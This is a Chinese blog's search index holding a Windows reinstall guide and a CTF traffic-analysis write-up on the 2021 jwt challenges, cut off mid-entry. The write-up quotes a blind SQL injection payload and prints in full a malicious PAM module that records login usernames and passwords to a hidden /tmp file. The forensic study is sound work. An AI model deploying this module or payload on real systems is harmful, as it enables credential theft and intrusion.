<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2024/10/28/%E9%87%8D%E8%A3%85%E7%B3%BB%E7%BB%9F/"/>
      <url>/2024/10/28/%E9%87%8D%E8%A3%85%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h3 id="为什么要重装系统？"><a href="#为什么要重装系统？" class="headerlink" title="为什么要重装系统？"></a>为什么要重装系统？</h3><ul><li><p><strong>系统崩溃或无法启动</strong>：当系统频繁崩溃或无法正常启动时，重装系统可以解决深层次的问题。</p></li><li><p><strong>病毒或恶意软件感染</strong>：如果电脑感染了无法清除的病毒或恶意软件，重装系统可以清除所有潜在威胁。</p></li><li><p><strong>系统性能显著下降</strong>：经过长时间使用，系统可能变得缓慢或不稳定，重装系统可以恢复性能。</p></li><li><p><strong>重要文件丢失或损坏</strong>：如果系统文件或关键应用程序损坏，重装可以修复这些问题。</p></li><li><p><strong>更新失败</strong>：在尝试升级到新版本的Windows时，如果出现问题，重装可能是个解决方案。</p></li><li><p><strong>个人需求变化</strong>：例如，想要清理系统或更改分区布局，也可以考虑重装。</p></li></ul><p>注意：在决定重装系统之前，确保备份重要数据，以免丢失。</p><h3 id="重装系统有哪些方法？"><a href="#重装系统有哪些方法？" class="headerlink" title="重装系统有哪些方法？"></a>重装系统有哪些方法？</h3><h4 id="U盘ESD"><a href="#U盘ESD" class="headerlink" title="U盘ESD"></a>U盘ESD</h4><p>[微软官方工具]: <a href="https://www.microsoft.com/zh-cn/software-download/windows11">https://www.microsoft.com/zh-cn/software-download/windows11</a>“重装”</p><p>访问微软官方资源网站，下载安装工具</p><p><img src="C:\Users\Haslet\AppData\Roaming\Typora\typora-user-images\image-20241027164411109.png" alt="image-20241027164411109"></p><p>核对是否满足运行以及安装系统的要求：</p><p>首先，你首先需要许可证才能安装 Windows 11，或拥有有资格升级到 Windows 11 的 Windows 10 设备。</p><p><strong>确保你：</strong></p><ul><li>拥有 Internet 连接（可能需要缴纳 Internet 服务提供商费用）。</li><li>在要下载 .iso 文件的计算机、USB 或外部驱动器上有足够的可用数据存储空间。</li><li>至少具有 8GB（和 DVD 刻录机）的空白 DVD 光盘，用于创建可启动光盘。我们建议使用空白 USB 或 DVD，因为在安装过程中其中的任何内容都将被删除。</li><li>如果在尝试从 ISO 文件刻录 DVD 可启动光盘时收到“光盘映像文件过大”消息，请考虑使用更高容量的双层 DVD。</li><li></li></ul><p><strong>确保要安装 Windows 11 的 PC：</strong></p><ul><li><p>拥有 64 位 CPU：</p><p> Windows 11 只能在 64 位 CPU 上运行。若要查看你的 PC 是否有 64 位 CPU，请转到设置 &gt; 系统 &gt; 关于，或在 Windows 中搜索“系统信息”，然后在“系统类型”下查看。</p><ul><li>Windows 11 媒体创建工具仅为 x64 处理器创建安装媒体。对于基于 ARM 的 PC，应等到通过 Windows 更新收到通知，告知你的 PC 已准备好升级。‪</li></ul></li><li><p>满足系统需求：</p><p> 并非所有运行 Windows 10 的设备都有资格获得 Windows 11 升级。请参阅下面的注释，其中包含以下链接：Windows 11 设备规格，了解升级要求和支持的功能。某些功能需要额外的硬件。</p><ul><li><strong>警告：</strong> 不建议在不符合 Windows 11 最低系统需求的 PC 上安装 Windows 11 媒体，这可能会导致兼容性问题。如果你继续在不符合要求的 PC 上安装 Windows 11，则该 PC 将不再受支持，并且无权接收更新。由于缺乏兼容性而导致的 PC 损坏不在制造商保修范围内。</li></ul></li><li><p><strong>匹配你当前的语言：</strong> 安装 Windows 11 时，你需要选择相同的语言。要了解你当前使用的语言，请转到 PC 设置中的 <strong>时间和语言</strong> 或控制面板中的 <strong>区域</strong> 。</p></li></ul><p><strong>注意：</strong> 有关升级要求和支持的功能，请参阅  <a href="https://www.microsoft.com/zh-cn/windows/windows-11-specifications"><strong>Windows 11 设备规格。</strong></a> 某些功能需要额外的硬件。我们还建议你访问 PC 制造商的网站，了解有关更新的驱动程序和硬件兼容性的信息。</p><p><strong>安装 Windows 11 之前，最好保存所有工作，并备份你的 PC，然后再开始安装。如果你使用介质创建工具下载了 Windows 11 的 ISO 文件，请记住先将该文件刻录到 DVD，然后再执行这些步骤：</strong></p><ol><li>在要安装 Windows 11 的 PC 上连接 USB 闪存驱动器或插入 DVD。</li><li>重启 PC。<ul><li>如果你的 PC 没有自动利用 USB 或 DVD 媒体启动，则可能需要打开启动菜单或在 PC 的 BIOS 或 UEFI 设置中更改启动顺序。 </li><li>要打开启动菜单或更改启动顺序，<strong>通常你需要在打开 PC 后立即按键（如 F2、F12、Delete 或 Esc 键）</strong>。有关访问启动菜单或更改 PC 启动顺序的说明，请检查 PC 附带的文档或转到制造商网站。</li><li>如果你没有看到启动选项中列出的 USB 或 DVD 媒体设备，则可能需要联系 PC 制造商，了解在 BIOS 设置中暂时禁用安全启动的说明。</li><li>如果更改启动菜单或顺序不起作用，并且你的 PC 会立即进入要替换的操作系统，则 PC 可能尚未完全关闭。为确保 PC 完全关闭，请选择登录屏幕上或“开始”菜单上的电源按钮，然后选择“关闭”。</li></ul></li><li>在<strong>安装 Windows</strong> 页上，选择语言、时间和键盘首选项，然后选择<strong>下一步</strong>。</li><li>选择<strong>安装 Windows</strong>。</li></ol><p><strong>重要说明：</strong> 如果在步骤 2 中更改了启动顺序，则可能会遇到在安装过程完成后显示初始 <strong>安装 Windows 页面</strong> 的情况。要解决此问题，你需要还原对引导顺序所做的更改。这样可以确保你刚刚安装 Windows 的内部驱动器能够正常启动。</p><h5 id="具体操作示范"><a href="#具体操作示范" class="headerlink" title="具体操作示范"></a>具体操作示范</h5><ul><li>准备一个8GB以上存储器用于制作重装镜像</li><li>在官方网站下载好<code>Media Creation Tool</code>工具，双击运行</li></ul><p><img src="C:\Users\Haslet\AppData\Roaming\Typora\typora-user-images\image-20241028160253107.png" alt="image-20241028160253107"></p><p>点击接受</p><p><img src="C:\Users\Haslet\AppData\Roaming\Typora\typora-user-images\image-20241028160328635.png" alt="image-20241028160328635"></p><p>我们选择U盘，创建Windows系统引导盘（注意：选择此种方式，该工具会现将U盘的数据全部擦除，仅保留系统镜像）</p><p>制作完成后U盘结构目录如图所示</p><p><img src="C:\Users\Haslet\AppData\Roaming\Typora\typora-user-images\image-20241028171927325.png" alt="image-20241028171927325"></p><p>制作好U盘关闭电脑，在开机的时候连续点击快捷键，不同型号电脑所使用的快捷键有所不同，如下图所示</p><p><img src="C:\Users\Haslet\AppData\Roaming\Typora\typora-user-images\image-20241028160949242.png" alt="image-20241028160949242"></p><p><img src="C:\Users\Haslet\AppData\Roaming\Typora\typora-user-images\image-20241028161003388.png" alt="image-20241028161003388"></p><p>顺利完成以上步骤就会跳转到安装系统界面，按照引导直接安装即可</p><p><img src="C:\Users\Haslet\AppData\Roaming\Typora\typora-user-images\image-20241028175534501.png" alt="image-20241028175534501"></p><h4 id="PE系统"><a href="#PE系统" class="headerlink" title="PE系统"></a>PE系统</h4><p>PE（Preinstallation Environment）安装适用于更复杂的场景或需要在不删除原有数据的情况下进行系统修复。</p><h5 id="具体操作示范-1"><a href="#具体操作示范-1" class="headerlink" title="具体操作示范"></a>具体操作示范</h5><ul><li>准备工具和镜像文件<br>准备一个至少8GB的U盘，下载所需的Windows系统镜像文件和PE工具箱<code>https://www.wepe.com.cn/download.html</code>（如微PE工具箱）。Windows镜像可从itellyou网站进行下载<code>https://next.itellyou.cn/Original/</code>，内容相较于其他网站比较纯净,且可以根据自己的需要选择合适的系统版本。</li></ul><p><img src="C:\Users\Haslet\AppData\Roaming\Typora\typora-user-images\image-20241028162121677.png" alt="image-20241028162121677"></p><ul><li>制作PE启动盘<br>在已安装Windows系统的电脑上打开PE工具箱的安装程序，选择将PE写入U盘，完成PE启动盘的制作。</li></ul><p><img src="C:\Users\Haslet\AppData\Roaming\Typora\typora-user-images\image-20241028172356545.png" alt="image-20241028172356545"></p><p><img src="C:\Users\Haslet\AppData\Roaming\Typora\typora-user-images\image-20241028172839340.png" alt="image-20241028172839340"></p><p>接着我们就会发现系统的资源管理器自动将U盘分了两个区，一个<code>EFI</code>和一个空U盘，我们将下载好的windows系统ISO文件放入启动盘中</p><p><img src="C:\Users\Haslet\AppData\Roaming\Typora\typora-user-images\image-20241028174201986.png" alt="image-20241028174201986"></p><ul><li>进入PE环境<br>将制作好的PE启动盘插入目标电脑，重启电脑并进入启动引导选择界面，启动进入PE系统。</li></ul><p><img src="C:\Users\Haslet\AppData\Roaming\Typora\typora-user-images\image-20241028202759781.png" alt="image-20241028202759781"></p><ul><li>安装系统</li></ul><p><img src="C:\Users\Haslet\AppData\Roaming\Typora\typora-user-images\image-20241028202843015.png" alt="image-20241028202843015"></p><ul><li>分区工具</li></ul><p>PE除了可以重新安装系统外，还可以使用软件对系统进行分区以及修复等高级操作</p><h3 id="不同的方法有哪些优缺点？"><a href="#不同的方法有哪些优缺点？" class="headerlink" title="不同的方法有哪些优缺点？"></a>不同的方法有哪些优缺点？</h3><h4 id="PE安装系统"><a href="#PE安装系统" class="headerlink" title="PE安装系统"></a>PE安装系统</h4><p>优点：</p><ol><li>灵活性高：PE系统通常集成了多种工具和驱动程序，可以方便地进行系统安装、维护、备份和恢复等操作。用户可以根据自己的需求选择适合的工具和功能。</li><li>支持多版本系统：通过PE系统，用户可以轻松地安装多个版本的Windows系统，而无需准备多个启动盘或U盘。</li><li>数据挽救能力强：当电脑出现蓝屏、黑屏等问题无法进入桌面时，PE系统可以帮助用户访问硬盘并挽救重要数据。</li><li>自定义程度高：对于高级用户来说，PE系统提供了更多的自定义选项，如分区管理、引导修复等，可以满足更复杂的系统安装和维护需求。</li></ol><p>缺点：</p><ol><li>安全性风险：由于PE系统可能由不同的开发者制作，其中一些可能包含恶意软件或广告插件，因此存在一定的安全风险。用户在选择PE系统时需要谨慎挑选可靠的来源。</li><li>操作复杂度较高：相对于微软官方工具，PE系统的操作界面可能更加复杂，需要用户具备一定的计算机知识和操作能力。</li><li>系统兼容性问题：某些PE系统可能不完全兼容所有硬件和软件环境，导致在安装过程中出现错误或不稳定的情况。</li></ol><h4 id="微软官方工具安装系统"><a href="#微软官方工具安装系统" class="headerlink" title="微软官方工具安装系统"></a>微软官方工具安装系统</h4><p>优点：</p><ol><li>安全可靠：微软官方工具提供的安装程序经过严格测试和验证，确保安全无虞且兼容性好。用户可以放心使用而不用担心安全问题。</li><li>操作简便快捷：微软官方工具的操作界面简洁明了，用户只需按照提示进行操作即可完成系统安装。整个过程相对简单快捷，适合新手用户使用。</li><li>官方支持与服务：使用微软官方工具进行系统安装可以获得官方的技术支持和服务保障。如果遇到问题或需要帮助，用户可以联系微软客服获得及时的解答和支持。</li></ol><p>缺点：</p><ol><li>灵活性较低：与PE系统相比，微软官方工具的安装过程相对固定，缺乏一定的灵活性。例如，它可能不支持某些特定的分区格式或硬件配置。</li><li>无法直接挽救数据：如果用户的电脑已经无法正常启动并进入桌面，那么微软官方工具可能无法直接帮助用户挽救硬盘上的重要数据（尽管可以通过其他方式实现）。</li><li>需要重新下载镜像文件：每次使用微软官方工具进行系统安装时都需要重新下载对应的Windows镜像文件，这可能会消耗一定的时间和网络带宽资源（但通常下载速度较快且稳定）。</li></ol><h3 id="如何让自己的电脑没有弹窗广告？"><a href="#如何让自己的电脑没有弹窗广告？" class="headerlink" title="如何让自己的电脑没有弹窗广告？"></a>如何让自己的电脑没有弹窗广告？</h3><h4 id="浏览器广告"><a href="#浏览器广告" class="headerlink" title="浏览器广告"></a>浏览器广告</h4><p>​下载相关广告屏蔽插件。如Chrome插件商店中查找</p><p><img src="C:\Users\Haslet\AppData\Roaming\Typora\typora-user-images\image-20241027165839518.png" alt="image-20241027165839518"></p><h4 id="软件广告"><a href="#软件广告" class="headerlink" title="软件广告"></a>软件广告</h4><ol><li>谨慎安装软件：<ul><li>只从官方和可信任的来源下载软件。例如，下载软件时，尽量选择软件的官方网站，而不是一些不知名的软件下载站。很多下载站会在软件安装包中捆绑广告软件或者其他恶意程序。在安装软件过程中，要仔细阅读安装向导的每一个步骤，很多广告软件会在安装过程中默认勾选安装，需要取消这些勾选才能避免安装不必要的广告软件。</li></ul></li><li>定期更新软件：<ul><li>软件开发者会不断更新软件来修复安全漏洞和改善性能。定期更新软件可以减少软件被广告软件利用的风险。例如，一些旧版本的软件可能存在安全漏洞，被恶意广告软件利用来弹出广告，而更新后的软件可以修复这些漏洞，从而避免广告弹窗。可以开启软件的自动更新功能（如果软件支持），或者定期手动检查更新。</li></ul></li></ol><h3 id="如何重置操作系统的密码"><a href="#如何重置操作系统的密码" class="headerlink" title="如何重置操作系统的密码"></a>如何重置操作系统的密码</h3><p>如果忘记了Windows系统的登录密码，可以通过以下方式重置：</p><ol><li><p>制作可启动U盘<br>使用如Windows Password Reset等工具制作一个可启动U盘。</p></li><li><p>启动U盘并进入恢复环境<br>将U盘插入忘记密码的电脑，重启电脑并从U盘启动，进入恢复环境。</p></li><li><p>重置密码<br>在恢复环境中找到相应的工具选项，选择要重置密码的用户账户，输入新密码并确认。</p></li><li><p>重启电脑<br>完成密码重置后，重启电脑并使用新密码登录系统。</p></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>流量分析和日志分析</title>
      <link href="/2024/10/27/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90&amp;%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
      <url>/2024/10/27/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90&amp;%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>日期: 2024 - 10 - 27</p><p>标签:</p><ul><li>流量分析</li><li>日志分析</li></ul><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>流量分析常涉及到解密、协议分析、会话重建等技巧，是考察选手对网络协议及工具熟练掌握程度的一个重要方向。</p><p><strong>流量捕获</strong><br>通常题目会提供一个<code>.pcap</code>文件，它是网络数据包的捕获文件，我们需要分析其中的流量数据。</p><p><strong>常用工具介绍</strong></p><ol><li><strong>Wireshark</strong>：最流行的网络协议分析工具，功能强大，可视化流量，支持各种协议的分析。</li><li><strong>tshark</strong>：Wireshark的命令行版本，适合自动化处理大规模数据。</li><li><strong>tcpdump</strong>：命令行网络抓包工具，灵活但需要掌握更多命令。</li><li><strong>NetworkMiner</strong>：用于分析网络流量并提取文件或会话的工具。</li><li><strong>Scapy</strong>：Python库，用于生成、分析网络数据包，适合深度定制的场景。</li></ol><p><strong>流量分析的常见流程</strong></p><ol><li><strong>初步检查流量文件</strong><ul><li>使用Wireshark或tshark打开<code>.pcap</code>文件，查看流量总量、协议类型、IP地址和端口。</li></ul></li><li><strong>协议识别与分析</strong><ul><li>确认流量中的常见协议（TCP、UDP、HTTP、DNS等），理解不同协议的特性，查找异常流量。</li></ul></li><li><strong>筛选和过滤数据包</strong><ul><li>使用Wireshark的过滤器功能，逐步缩小感兴趣的数据包范围。比如，HTTP流量的过滤条件是<code>http</code>，DNS是<code>dns</code>，通过源&#x2F;目的IP、端口等进一步过滤。</li></ul></li><li><strong>重建会话和提取内容</strong><ul><li>如果是HTTP或FTP协议，可以重建数据流，提取文件、图片或文本信息。</li><li>可以尝试通过流量中的关键字或payload查找线索，如查找flag。</li></ul></li><li><strong>查找异常行为或隐藏信息</strong><ul><li>检查是否存在数据加密、编码、隐藏通信通道（如DNS隧道）。</li><li>查找流量中不常见的协议、端口或可疑的数据包，尤其是看上去无意义的流量。</li></ul></li></ol><p><strong>流量分析常见题型</strong></p><ul><li><strong>HTTP流量分析</strong><br>题目常提供HTTP抓包文件，通过重建会话，可以获得flag，或通过特定请求的返回包中的信息来解决问题。</li><li><strong>DNS流量分析</strong><br>通过DNS隧道或编码方式传递信息，需要通过流量中的域名、数据包内容进行解码，获取有用信息。</li><li><strong>文件传输分析</strong><br>抓包文件可能包含FTP、SMTP等协议的文件传输，通过提取文件或分析文件内容来解题。</li><li><strong>加密或编码流量</strong><br>流量可能通过某种加密或编码方式传输，利用常见的编码解密工具或自编脚本解密。</li></ul><h3 id="例题-（HTTP）"><a href="#例题-（HTTP）" class="headerlink" title="例题 （HTTP）"></a>例题 （HTTP）</h3><h4 id="鹤城杯-2021-流量分析"><a href="#鹤城杯-2021-流量分析" class="headerlink" title="[鹤城杯 2021]流量分析"></a>[鹤城杯 2021]流量分析</h4><p>下载附件得到timu.pacpng文件，首先整体浏览分组数目（25331组）以及协议架构层次</p><p><img src="https://haslet007.github.io/img/image-20240919170810168.png" alt="image-20240919170810168"></p><p>由图可以看出该数据包整体使用了IPv4TCP的http协议进行数据传输，外带个别的ICMPv6和ARP协议分组数据包。</p><p>由于该流量分组数据量较大，而http协议占比居多，先筛选出http协议的数据包。</p><p><img src="https://haslet007.github.io/img/image-20240919171755021.png" alt="image-20240919171755021"></p><p>从Http的数据包的Info栏看出此请求是SQL注入攻击，其输入的语法是明显的SQL语句。</p><p>紧接着跟踪HTTP流，尝试还原对话。</p><p><img src="https://haslet007.github.io/img/image-20240919212037266.png" alt="image-20240919212037266"></p><p>从对话中可以看出</p><p><strong>SQL注入攻击请求</strong>：</p><ul><li>攻击者试图通过SQL注入技术来从数据库中获取信息，特别是 <code>flag</code> 字段。</li><li>请求中的SQL注入语句如下：<code>id=1&#39; and ascii(substr((select flag from t),1,1))=43--+</code></li></ul><p>攻击者希望通过逐字节解析数据库中的某个表（<code>t</code>）中的 <code>flag</code> 字段。具体操作是通过 <code>substr</code> 函数提取 <code>flag</code> 字段的第一个字符（<code>1,1</code>表示第一个字符），并与ASCII值43进行比较。</p><p><strong>HTTP请求头信息</strong>：</p><ul><li><strong>Host</strong>: <code>192.168.246.1</code>，攻击目标服务器的IP地址。</li><li><strong>User-Agent</strong>: <code>python-requests/2.18.4</code>，表示请求是通过Python的 <code>requests</code> 库发送的，说明攻击者使用了自动化脚本来进行注入攻击。</li><li><strong>Connection</strong>: <code>keep-alive</code>，表示请求保持连接，方便攻击者发送多个后续的请求来进行下一步注入。</li></ul><p><strong>服务器响应信息</strong>：</p><ul><li><strong>HTTP状态码</strong>：<code>200 OK</code>，表明服务器成功处理了这个SQL注入请求。</li><li><strong>服务器类型</strong>：<code>nginx/1.18.0</code>，这是服务器软件的版本信息，说明服务器运行的是Nginx 1.18.0。</li><li><strong>PHP版本</strong>：<code>PHP/5.6.31</code>，服务器端正在运行PHP 5.6.31版本，这可能是目标系统的潜在弱点，因为较老的PHP版本通常存在安全漏洞。</li><li><strong>返回的HTML页面内容</strong>：返回的页面内容是一个欢迎页面，包含简单的文本和图片，没有直接显示攻击者期待的数据库信息。但在一次完整的SQL注入攻击中，攻击者会继续进行下一步字符的提取。</li></ul><p><strong>总结：</strong></p><ul><li><p>该会话是攻击者通过SQL注入攻击目标服务器，试图获取数据库中 <code>flag</code> 字段的某个字符。当前的攻击目的是验证该字符的ASCII值是否为43（即字符 <code>+</code>），但在此响应中服务器返回了常规的HTML页面，并未直接暴露 <code>flag</code> 信息。</p></li><li><p>攻击者很可能会继续通过类似的注入请求逐字解析 <code>flag</code> 字段。</p></li></ul><p>由于之前追踪TCP&#x2F;HTTP流使用的SQL注入，所以接下来的思路是想办法过滤出SQL注入的流量以便于分析，在左上角过滤那一栏输入<code>http</code>进行过滤，接着看过滤出来的数据包，发现是布尔注入，如果SQL语句查询结果正确，那么就会进行下一位的查找，所以只要找到当前substr（）那边，最大的数字就行，提取出来转换成字符，拿就可以到flag，102 108 97 103 123 119 49 114 101 115 104 65 82 75 95 101 122 95 49 115 110 116 105 116 125 126 126 126 126将以上的ASCII码转换成字母即可</p><p><img src="https://haslet007.github.io/img/image-20241024170039400.png" alt="image-20241024170039400"></p><h4 id="陇剑杯-2021-jwt（问1）"><a href="#陇剑杯-2021-jwt（问1）" class="headerlink" title="[陇剑杯 2021]jwt（问1）"></a>[陇剑杯 2021]jwt（问1）</h4><p>题目描述：昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：<br>该网站使用了______认证方式。（如有字母请全部使用小写）。得到的flag请使用NSSCTF{}格式提交。</p><p>拿到附件追踪http流还原对话</p><p>请求部分</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /identity HTTP/1.1</span><br><span class="line">Host: 192.168.2.197:8081</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 29</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://192.168.2.197:8081</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://192.168.2.197:8081/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=3f8coeg6hm9vf0h5lcoifmk8o5</span><br><span class="line"></span><br><span class="line">username=admin&amp;identity=admin</span><br></pre></td></tr></table></figure><p>响应部分</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Set-Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTAwODYsIk1hcENsYWltcyI6eyJhdWQiOiJhZG1pbiIsInVzZXJuYW1lIjoiYWRtaW4ifX0.dJArtwXjas3_Cg9a3tr8COXF7DRsuX8UjmbC1nKf8fc; Path=/; Max-Age=3600; HttpOnly</span><br><span class="line">Date: Sat, 07 Aug 2021 05:09:16 GMT</span><br><span class="line">Content-Length: 225</span><br></pre></td></tr></table></figure><p>在请求部分的<code>token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTAwODYsIk1hcENsYWltcyI6eyJhdWQiOiJhZG1pbiIsInVzZXJuYW1lIjoiYWRtaW4ifX0.dJArtwXjas3_Cg9a3tr8COXF7DRsuX8UjmbC1nKf8fc;</code>是一个典型的jwt认证协议，故问1flag得出。</p><h4 id="陇剑杯-2021-jwt（问2）"><a href="#陇剑杯-2021-jwt（问2）" class="headerlink" title="[陇剑杯 2021]jwt（问2）"></a>[陇剑杯 2021]jwt（问2）</h4><p>题目描述：昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：<br>黑客绕过验证使用的jwt中，id和username是______。（中间使用#号隔开，例如1#admin）。得到的flag请使用NSSCTF{}格式提交。</p><p>在问1发现的token进行base64解码后如图所示</p><p><img src="https://haslet007.github.io/img/image-20240920174815763.png" alt="image-20240920174815763"></p><p>显示了许多信息，其中就包括了题目要求寻找的<code>id</code>和<code>username</code>，id为<code>10086</code>,username为<code>admin</code>，flag得出</p><h4 id="陇剑杯-2021-jwt（问3）"><a href="#陇剑杯-2021-jwt（问3）" class="headerlink" title="[陇剑杯 2021]jwt（问3）"></a>[陇剑杯 2021]jwt（问3）</h4><p>题目描述：昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：<br>黑客获取webshell之后，权限是______？。得到的flag请使用NSSCTF{}格式提交。</p><p>在追踪TCP流中搜索<code>command</code>发现出现<code>whoami</code>，继续查找响应包发现文本<code>The administrator has the authority to do this, you can...t</code>非常有可能是管理员在操作，故flag先尝试root，成功解题。</p><p><img src="https://haslet007.github.io/img/image-20240920180238326.png" alt="image-20240920180238326"></p><p>在第10个流中http会话返回的root佐证的flag</p><p><img src="https://haslet007.github.io/img/image-20240920181306376.png" alt="image-20240920181306376"></p><h4 id="陇剑杯-2021-jwt（问4）"><a href="#陇剑杯-2021-jwt（问4）" class="headerlink" title="[陇剑杯 2021]jwt（问4）"></a>[陇剑杯 2021]jwt（问4）</h4><p>题目描述：昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：<br>黑客上传的恶意文件文件名是_____________。(请提交带有文件后缀的文件名，例如x.txt)。得到的flag请使用NSSCTF{}格式提交。</p><p>查看<code>info</code>栏关键数据未发现什么结果，由于此pcap文件分组较少，可以逐一分析出每个http流的内容，最终在第13个http流中发现上传的文件<code>1.c</code>，如果有需要还可以通过url解码和base64解码得到上传的.c文件内容。</p><p><img src="https://haslet007.github.io/img/image-20240921115450292.png" alt="image-20240921115450292"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;curl/curl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;security/pam_appl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;security/pam_modules.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">write_data</span><span class="params">(<span class="type">void</span> *buffer, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, <span class="type">void</span> *userp)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> size * nmemb;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveMessage</span><span class="params">(<span class="type">char</span> (*message)[])</span> &#123;</span><br><span class="line">    FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line">    fp = fopen(<span class="string">&quot;/tmp/.looter&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">    <span class="built_in">fputs</span>(*message, fp);</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PAM_EXTERN <span class="type">int</span> <span class="title function_">pam_sm_setcred</span><span class="params">( <span class="type">pam_handle_t</span> *pam, <span class="type">int</span> flags, <span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv )</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> PAM_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PAM_EXTERN <span class="type">int</span> <span class="title function_">pam_sm_acct_mgmt</span><span class="params">(<span class="type">pam_handle_t</span> *pam, <span class="type">int</span> flags, <span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> PAM_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PAM_EXTERN <span class="type">int</span> <span class="title function_">pam_sm_authenticate</span><span class="params">( <span class="type">pam_handle_t</span> *pam, <span class="type">int</span> flags, <span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv )</span> &#123;</span><br><span class="line">    <span class="type">int</span> retval;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* username;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* password;</span><br><span class="line">    <span class="type">char</span> message[<span class="number">1024</span>];</span><br><span class="line">    retval = pam_get_user(pam, &amp;username, <span class="string">&quot;Username: &quot;</span>);</span><br><span class="line">    pam_get_item(pam, PAM_AUTHTOK, (<span class="type">void</span> **)&amp;password);</span><br><span class="line">    <span class="keyword">if</span> (retval != PAM_SUCCESS) &#123;</span><br><span class="line">        <span class="keyword">return</span> retval;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">snprintf</span>(message, <span class="number">2048</span>, <span class="string">&quot;Username %s\nPassword: %s\n&quot;</span>, username, password);</span><br><span class="line">    saveMessage(&amp;message);</span><br><span class="line">    <span class="keyword">return</span> PAM_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="陇剑杯-2021-jwt（问5）"><a 